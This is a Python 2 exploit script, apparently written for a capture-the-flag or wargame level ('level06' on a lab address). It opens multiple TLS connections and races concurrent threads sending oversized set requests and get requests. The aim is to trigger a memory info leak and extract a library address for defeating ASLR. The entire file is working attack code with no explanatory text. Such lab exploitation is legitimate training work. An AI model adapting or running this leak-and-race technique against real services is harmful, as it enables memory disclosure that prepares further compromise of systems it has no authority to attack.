#!/usr/bin/env python
import socket
from struct import *
import time
import ssl
import random
import threading

#ugly info leak with ugly implementation. My bad.

TCP_IP = '10.0.0.1'
TCP_PORT = 20006
BUFFER_SIZE = 1024

def getaddress(leak):
	addrpos = leak.find("\xb7")
	if addrpos == -1:
		return "No address found in leak. Run again please"

	addr = leak[addrpos-3:addrpos+1]
	if leak[addrpos-3] != "\x38":
		return "Wrong address found, looking for specific. ["+addr.encode("hex")+"] Run again please"
	addr = leak[addrpos-3:addrpos+1]
	return addr.encode("hex")

def getaddress2(leak):
        addrpos = 0
        while addrpos != -1:
                addrpos = leak.find("\x38", addrpos+1)
                if addrpos == -1:
                        return "No address found in leak. Run again please"
                
                addr = leak[addrpos:addrpos+4]
                if (leak[addrpos+3] != "\xb7") and (leak[addrpos+3] != "\xb8"):
                        print "Wrong address found, looking for specific. ["+addr.encode("hex")+"] Run again please"
                else:
                        return "Found: "+addr.encode("hex")


class myThread (threading.Thread):
    def __init__(self, threadID, name, count):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.count = count
    def run(self):
        dosomedemage(self.name, self.count)

def dosomedemage(name, count):
	s_plain = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s_plain.connect((TCP_IP, TCP_PORT))
	s = ssl.wrap_socket(s_plain, ca_certs='level06.pem',
                                cert_reqs=ssl.CERT_REQUIRED,
                                ssl_version=ssl.PROTOCOL_TLSv1)
	infoleak = ""
	data = s.recv(BUFFER_SIZE)	

	while True:
		if name in "first":
			s.send("s a %d\n" % (count))
			s.send("A"*count)
			data = s.recv(BUFFER_SIZE)

		if name in "second":
			s.send("s a %d\n" % (count))
			s.send("A"*count)
			data = s.recv(BUFFER_SIZE)

		if name in "third":
			s.send("g a\n")
			try:
				data = s.recv(BUFFER_SIZE)
				if "// Sending" not in data:
                                	infoleak += data
				data = s.recv(BUFFER_SIZE)
				if "A"*10 not in data:
					infoleak += data
			except:
				print getaddress(infoleak)
				break
	s.close()


s_plain = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s_plain.connect((TCP_IP, TCP_PORT))
s = ssl.wrap_socket(s_plain, ca_certs='level06.pem',
                               cert_reqs=ssl.CERT_REQUIRED,
                               ssl_version=ssl.PROTOCOL_TLSv1)
data = s.recv(BUFFER_SIZE)

s.send("s a 100\n")
s.send("A"*100)
data = s.recv(BUFFER_SIZE)

thread1 = myThread(1, "first", 1000)
thread2 = myThread(2, "second", 10)
thread3 = myThread(3, "third", 1)

thread1.start()
thread2.start()
thread3.start()
